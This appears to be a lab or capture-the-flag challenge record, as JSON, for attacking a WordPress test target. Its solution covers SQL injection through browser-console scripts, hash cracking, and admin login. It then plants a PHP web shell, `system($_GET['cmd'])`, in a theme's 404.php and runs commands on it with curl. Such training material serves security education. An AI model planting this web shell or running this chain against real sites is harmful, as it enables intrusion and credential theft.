{"description":"An attack on wordpress by exploiting vulnerabilities in some plugins","goal":"<p>The final goal is to obtain credentials to access WordPress and add a web shell to obtain a Remote Code Execution and access, with a Local File Inclusion attack, the file /etc/passwd</p>","solution":"<p><span class=\"ui-provider ud b c d e f g h i j k l m n o p q r s t u v w x y z ab ac ae af ag ah ai aj ak\" dir=\"ltr\"><span class=\"cm-line\">Connect to the kali shell using the dsp. </span></span></p>\n<p><span class=\"ui-provider ud b c d e f g h i j k l m n o p q r s t u v w x y z ab ac ae af ag ah ai aj ak\" dir=\"ltr\"><span class=\"cm-line\">enable vnc running the script in ./home/vnc.sh</span></span></p>\n<p><span class=\"ui-provider ud b c d e f g h i j k l m n o p q r s t u v w x y z ab ac ae af ag ah ai aj ak\" dir=\"ltr\"><span class=\"cm-line\">connect to the GUI using a vncviewer</span></span></p>\n<p><span class=\"ui-provider ud b c d e f g h i j k l m n o p q r s t u v w x y z ab ac ae af ag ah ai aj ak\" dir=\"ltr\"><span class=\"cm-line\">browse using the kali's browser the target at the ip 193.20.1.4 </span></span></p>\n<p><span class=\"ui-provider ud b c d e f g h i j k l m n o p q r s t u v w x y z ab ac ae af ag ah ai aj ak\" dir=\"ltr\"><span class=\"cm-line\">use the unknown mode </span><span class=\"cm-line\">answer Yes to the poll </span></span></p>\n<p><span class=\"ui-provider ud b c d e f g h i j k l m n o p q r s t u v w x y z ab ac ae af ag ah ai aj ak\" dir=\"ltr\"><span class=\"cm-line\">open with a text editor the script at /home/sql_inj_script.js </span></span></p>\n<p><span class=\"ui-provider ud b c d e f g h i j k l m n o p q r s t u v w x y z ab ac ae af ag ah ai aj ak\" dir=\"ltr\"><span class=\"cm-line\">copy/paste the first part in the browser's console </span><span class=\"cm-line\">after the reload of the page you will se an error in the console </span><span class=\"cm-line\">copy/paste the second step of the script and you'll get the users list in the console</span></span></p>\n<p><span class=\"ui-provider ud b c d e f g h i j k l m n o p q r s t u v w x y z ab ac ae af ag ah ai aj ak\" dir=\"ltr\"><span class=\"cm-line\">repeat again with the 3rd and 4th part of the script </span><span class=\"cm-line\">you'll get the hashes list in the browser's console.</span></span></p>\n<p><span class=\"ui-provider ud b c d e f g h i j k l m n o p q r s t u v w x y z ab ac ae af ag ah ai aj ak\" dir=\"ltr\"><span class=\"cm-line\">copy/paste the hash in the hash.txt file in the directory home </span><span class=\"cm-line\">open the terminal and do the following commands </span><span class=\"cm-line\">cd /home </span><span class=\"cm-line\">./discover_psw.sh </span><span class=\"cm-line\">you'll find the match hash:pwd in the file cracked.txt </span></span></p>\n<p><span class=\"ui-provider ud b c d e f g h i j k l m n o p q r s t u v w x y z ab ac ae af ag ah ai aj ak\" dir=\"ltr\"><span class=\"cm-line\">login in at the following </span><span class=\"cm-line\">http://193.20.1.4/wp-login.php </span><span class=\"cm-line\">open the theme editor and edit the page 404.php ofthe theme twentytwenty </span><span class=\"cm-line\">over write all the code with the following </span></span></p>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p><span class=\"ui-provider ud b c d e f g h i j k l m n o p q r s t u v w x y z ab ac ae af ag ah ai aj ak\" dir=\"ltr\"><span class=\"cm-line\">&lt;?php</span></span></p>\n<p><span class=\"ui-provider ud b c d e f g h i j k l m n o p q r s t u v w x y z ab ac ae af ag ah ai aj ak\" dir=\"ltr\"><span class=\"cm-line\"> system($_GET['cmd']); </span></span></p>\n<p><span class=\"ui-provider ud b c d e f g h i j k l m n o p q r s t u v w x y z ab ac ae af ag ah ai aj ak\" dir=\"ltr\"><span class=\"cm-line\">/** </span></span></p>\n<p><span class=\"ui-provider ud b c d e f g h i j k l m n o p q r s t u v w x y z ab ac ae af ag ah ai aj ak\" dir=\"ltr\"><span class=\"cm-line\">&lt;SNIP&gt;</span></span></p>\n<p>&nbsp;</p>\n<p><span class=\"ui-provider ud b c d e f g h i j k l m n o p q r s t u v w x y z ab ac ae af ag ah ai aj ak\" dir=\"ltr\"><span class=\"cm-line\">call the following url for the remote code execution, you can do any shell command passing after the cmd parameter in the url </span><span class=\"cm-line\">here's an example</span></span></p>\n<p><span class=\"ui-provider ud b c d e f g h i j k l m n o p q r s t u v w x y z ab ac ae af ag ah ai aj ak\" dir=\"ltr\"><span class=\"cm-line\">curl -X GET &ldquo;http://193.20.1.4/wp-content/themes/twentytwenty/404.php?cmd=cat%20flag.txt&rdquo;</span></span></p>","author":"mgalateo"}
